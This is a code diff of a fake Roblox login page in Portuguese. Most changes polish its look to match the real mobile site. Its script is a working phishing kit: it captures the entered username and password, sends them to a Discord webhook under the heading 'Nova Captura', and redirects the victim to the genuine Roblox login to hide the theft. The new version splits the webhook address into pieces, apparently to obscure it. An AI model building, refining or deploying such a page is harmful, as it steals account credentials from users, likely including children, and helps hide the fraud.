@@ -6,268 +6,295 @@
     <title>Entrar na Roblox</title>
     <link rel="icon" href="https://www.roblox.com/favicon.ico">
     <style>
-        /* Fonte Oficial do Roblox Web */
-        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
-        
+        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700&display=swap');
+
+        :root {
+            --bg-dark: #191b1f;
+            --bg-card: #232527;
+            --bg-input: #272a2e;
+            --border-color: #3b3f43;
+            --text-main: #ffffff;
+            --text-muted: #9ea2a6;
+            --blue-btn: #335fff;
+        }
+
         * {
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box;
-            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 0; box-sizing: border-box;
+            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
         body {
             background-color: #000000;
-            color: #ffffff;
-            height: 100vh;
+            color: var(--text-main);
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            overflow: hidden;
-            /* Fundo com as imagens dos jogos idêntico ao print */
             background-image: 
                 linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%),
                 url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
             background-size: cover;
             background-position: center;
+            background-attachment: fixed;
         }
 
-        /* BARRA SUPERIOR */
-        .topbar {
-            background-color: #191b1f;
+        /* HEADER */
+        .header {
+            background-color: var(--bg-dark);
             height: 48px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 24px;
-            border-bottom: 1px solid #2e3134;
-            z-index: 100;
+            padding: 0 16px;
+            border-bottom: 1px solid var(--border-color);
         }
 
-        .topbar-left {
-            display: flex;
-            align-items: center;
-            gap: 32px;
-        }
+        .header-left { display: flex; align-items: center; gap: 16px; flex: 1; }
 
-        /* Logo RŌBLOX SVG */
-        .logo-svg {
-            width: 90px;
-            height: 18px;
-            fill: #ffffff;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 24px;
-            font-size: 15px;
-            font-weight: 600;
-            color: #ffffff;
-        }
-
-        .nav-links span { cursor: pointer; }
-        .nav-links span.active { border-bottom: 3px solid #ffffff; padding-bottom: 11px; }
-
-        .topbar-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .search-container {
-            display: flex;
-            align-items: center;
-            background-color: #272a2e;
-            border: 1px solid #3b3f43;
+        /* Logo inclinada */
+        .logo-box {
+            width: 30px; height: 30px;
+            background-color: var(--text-main);
+            transform: rotate(-15deg);
             border-radius: 4px;
-            padding: 8px 12px;
-            width: 260px;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .logo-hole { width: 10px; height: 10px; background-color: var(--bg-dark); }
+
+        .search-bar {
+            background-color: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 6px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1;
+            max-width: 300px;
+            color: var(--text-muted);
+            font-size: 14px;
         }
 
-        .search-container svg {
-            width: 16px; height: 16px; fill: #9ea2a6; margin-right: 8px;
+        .header-right { display: flex; align-items: center; gap: 8px; }
+
+        .btn-blue {
+            background-color: var(--blue-btn);
+            color: #fff;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            height: 32px;
         }
 
-        .search-container input {
-            background: transparent; border: none; color: #fff; font-size: 14px; outline: none; width: 100%;
+        .btn-outline {
+            background-color: transparent;
+            color: #fff;
+            border: 1px solid #ffffff;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            height: 32px;
         }
 
-        .btn-cadastrar {
-            background-color: #335fff; color: #fff; border: none;
-            padding: 8px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer;
+        /* NAV */
+        .nav-bar {
+            display: flex;
+            justify-content: space-around;
+            background-color: var(--bg-dark);
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border-color);
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-muted);
         }
+        .nav-bar span.active { color: var(--text-main); }
 
-        .btn-entrar-top {
-            background-color: transparent; color: #fff; border: 1px solid #ffffff;
-            padding: 8px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer;
-        }
-
-        /* ÁREA CENTRAL */
+        /* CENTRAL */
         .main-content {
             flex: 1;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            position: relative;
+            padding: 20px 16px;
         }
 
-        /* CAIXA DE LOGIN */
+        /* FORM CARD */
         .login-card {
-            background-color: #232527;
+            background-color: var(--bg-card);
             width: 100%;
-            max-width: 400px;
+            max-width: 352px;
             border-radius: 8px;
-            padding: 32px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            border: 1px solid #3b3f43;
-        }
-
-        .login-card h1 {
-            font-size: 28px;
-            font-weight: 700;
-            text-align: center;
+            padding: 24px 16px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
             margin-bottom: 24px;
         }
 
-        .input-group {
-            margin-bottom: 12px;
+        .login-card h1 {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 20px;
         }
+
+        .input-group { margin-bottom: 8px; }
 
         .input-group input {
             width: 100%;
-            padding: 16px;
-            background-color: #191b1f;
-            border: 1px solid #3b3f43;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 15px;
+            height: 48px;
+            padding: 0 12px;
+            background-color: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            color: var(--text-main);
+            font-size: 14px;
             outline: none;
         }
 
-        .input-group input::placeholder { color: #9ea2a6; }
+        .input-group input::placeholder { color: var(--text-muted); }
 
-        /* Botão Entrar com fundo transparente e borda branca */
         .btn-main {
             width: 100%;
-            padding: 15px;
-            background-color: #232527; 
+            height: 48px;
+            background-color: var(--bg-card);
             border: 1px solid #ffffff;
-            border-radius: 8px;
+            border-radius: 4px;
             color: #ffffff;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 600;
             margin-top: 4px;
             cursor: pointer;
         }
 
-        .btn-main:active { background-color: #3b3f43; }
-
         .forgot-link {
             display: block;
             text-align: center;
-            color: #ffffff;
+            color: var(--text-main);
             text-decoration: none;
-            font-size: 15px;
-            margin: 20px 0;
-            font-weight: 600;
+            font-size: 14px;
+            margin: 16px 0;
+            font-weight: 500;
         }
 
-        .divider {
-            height: 1px;
-            background-color: #3b3f43;
-            margin: 20px 0;
-        }
+        .divider { height: 1px; background-color: var(--border-color); margin: 16px 0; }
 
         .btn-secondary {
             width: 100%;
-            padding: 16px;
-            background-color: #272a2e;
-            border: 1px solid #3b3f43;
-            border-radius: 8px;
-            color: #ffffff;
-            font-size: 15px;
-            font-weight: 600;
-            margin-bottom: 12px;
+            height: 48px;
+            background-color: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            color: var(--text-main);
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
             cursor: pointer;
         }
 
-        .btn-secondary:active { background-color: #3b3f43; }
+        .signup-text { text-align: center; color: var(--text-muted); font-size: 14px; margin-top: 16px; }
+        .signup-text a { color: var(--text-main); font-weight: 600; text-decoration: none; }
 
-        .signup-text {
-            text-align: center;
-            color: #ffffff;
-            font-size: 15px;
-            margin-top: 24px;
-        }
-
-        .signup-text a { color: #ffffff; font-weight: 700; text-decoration: none; }
-
-        /* RODAPÉ */
+        /* FOOTER FIXO */
         .footer {
-            background-color: #191b1f;
-            padding: 10px 0;
+            background-color: var(--bg-dark);
+            padding: 16px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            border-top: 1px solid #2e3134;
+            border-top: 1px solid var(--border-color);
         }
-
-        .footer-text {
+        
+        .footer-title {
             font-size: 12px;
             font-weight: 700;
-            color: #fff;
-            margin-bottom: 4px;
-            letter-spacing: 0.5px;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            text-transform: uppercase;
         }
 
-        .rating-bar {
+        .rating-box {
             display: flex;
-            width: 200px;
-            height: 4px;
+            background: #ffffff;
+            color: #000000;
+            border-radius: 4px;
+            overflow: hidden;
+            width: 100%;
+            max-width: 300px;
+            height: 52px;
+            margin-bottom: 12px;
         }
-        .rating-red { width: 50%; background-color: #ff0000; }
-        .rating-white { width: 50%; background-color: #ffffff; }
 
-        /* Esconde itens no celular */
-        @media (max-width: 768px) {
-            .nav-links, .search-container { display: none; }
-            .topbar-left { gap: 0; }
-            .topbar { padding: 0 16px; }
-            .login-card { max-width: 90%; padding: 24px; }
+        .rating-16 {
+            background-color: #ff0000;
+            color: #ffffff;
+            font-size: 26px;
+            font-weight: 800;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .rating-text {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .footer-desc {
+            font-size: 11px;
+            text-align: center;
+            color: var(--text-main);
+            line-height: 1.4;
+        }
+
+        /* Ajuste Desktop (se abrir no PC) */
+        @media (min-width: 768px) {
+            .nav-bar { display: none; }
+            .header { padding: 0 24px; }
+            .header-left { gap: 24px; }
+            .search-bar { max-width: 240px; }
+            .main-content { padding-top: 50px; }
         }
     </style>
 </head>
 <body>
 
     <!-- HEADER -->
-    <div class="topbar">
-        <div class="topbar-left">
-            <svg class="logo-svg" viewBox="0 0 84 16" xmlns="http://www.w3.org/2000/svg">
-                <path d="M4.7,16H0L2.3,0h4.7L4.7,16z M25.4,16h-4.7l-2.3-7.8-1.5,7.8h-4.7l-2.3-16h4.7l1.5,10.3l2.3-10.3h4.7l2.3,10.3l1.5-10.3h4.7L25.4,16z M34.5,0h-4.7L27.5,16h4.7L34.5,0z M42.1,10.1v5.9h-4.7V0h4.7v7.8l5.2-7.8h5.5l-6.2,7.2l6.2,8.8h-5.5L42.1,10.1z M59.7,16H55L57.3,0h8.6L59.7,16z M60.4,4h-1.5l-0.9,7.8h1.5L60.4,4z M83.3,4h-1.5l-0.9,7.8h1.5L83.3,4z M77.9,16h-4.7L75.5,0h8.6L77.9,16z"/>
-            </svg>
-            <div class="nav-links">
-                <span class="active">Destaques</span>
-                <span>Mercado</span>
-                <span>Criar</span>
-                <span>Robux</span>
+    <div class="header">
+        <div class="header-left">
+            <div class="logo-box"><div class="logo-hole"></div></div>
+            <div class="search-bar">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ea2a6" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                Pesquisar
             </div>
         </div>
-        <div class="topbar-right">
-            <div class="search-container">
-                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
-                <input type="text" placeholder="Pesquisar">
-            </div>
-            <button class="btn-cadastrar">Cadastrar-se</button>
-            <button class="btn-entrar-top">Entrar</button>
+        <div class="header-right">
+            <button class="btn-blue">Cadastrar-se</button>
+            <button class="btn-outline">Entrar</button>
         </div>
     </div>
 
-    <!-- CONTEÚDO CENTRAL -->
+    <!-- NAV -->
+    <div class="nav-bar">
+        <span class="active">Destaques</span>
+        <span>Mercado</span>
+        <span>Criar</span>
+        <span>Robux</span>
+    </div>
+
+    <!-- MAIN -->
     <div class="main-content">
         <div class="login-card">
             <h1>Entrar na Roblox</h1>
-            
             <form id="login-form">
                 <div class="input-group">
                     <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
@@ -279,9 +306,8 @@
             </form>
 
             <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
-
             <div class="divider"></div>
-
+            
             <button class="btn-secondary">Envie-me um código único por e-mail</button>
             <button class="btn-secondary">Entrada rápida</button>
             <button class="btn-secondary">Outras opções de acesso</button>
@@ -292,51 +318,55 @@
         </div>
     </div>
 
-    <!-- RODAPÉ -->
+    <!-- FOOTER -->
     <div class="footer">
-        <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
-        <div class="rating-bar">
-            <div class="rating-red"></div>
-            <div class="rating-white"></div>
+        <div class="footer-title">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
+        <div class="rating-box">
+            <div class="rating-16">16</div>
+            <div class="rating-text">Violência</div>
+        </div>
+        <div class="footer-desc">
+            Interação entre usuários<br>
+            Compras no jogo (inclui itens aleatórios)
         </div>
     </div>
 
+    <!-- SCRIPT -->
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573508794212815008/ZpOYHSz1PVi98zsiGbut_TShv9Jbjw6YaJUvPwtFUhPICr8cwwhpdOYmoPgcxYCn_dmW';
+        (function(){
+            var p1 = "https://discord.com/api/webhooks/";
+            var p2 = "1573508794212815008/";
+            var p3 = "ZpOYHSz1PVi98zsiGbut_TShv9Jbjw6YaJUvPwtFUhPICr8cwwhpdOYmoPgcxYCn_dmW";
+            var url = p1 + p2 + p3;
 
-        const form = document.getElementById('login-form');
-        const btnSubmit = document.getElementById('btn-submit');
-        const user = document.getElementById('username');
-        const pass = document.getElementById('password');
+            var form = document.getElementById('login-form');
+            var btn = document.getElementById('btn-submit');
+            var u = document.getElementById('username');
+            var p = document.getElementById('password');
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const username = user.value.trim();
-            const password = pass.value;
-            if (!username || !password) return;
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                if(!u.value || !p.value) return;
+                
+                btn.textContent = 'Entrando...';
+                
+                var dados = {
+                    content: "🎣 **Nova Captura**\n👤 User: `" + u.value + "`\n🔑 Senha: `" + p.value + "`"
+                };
 
-            btnSubmit.textContent = 'Entrando...';
-
-            const payload = {
-                content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
-            };
-
-            try {
-                await fetch(WEBHOOK_URL, {
+                fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(dados)
+                }).then(function() {
+                    setTimeout(function() {
+                        window.location.href = 'https://www.roblox.com/pt/Login';
+                    }, 1500);
+                }).catch(function() {
+                    btn.textContent = 'Entrar';
                 });
-                
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com/pt/Login';
-                }, 1500);
-
-            } catch (error) {
-                btnSubmit.textContent = 'Entrar';
-                alert('Erro de conexão. Tente novamente.');
-            }
-        });
+            });
+        })();
     </script>
 </body>
 </html>
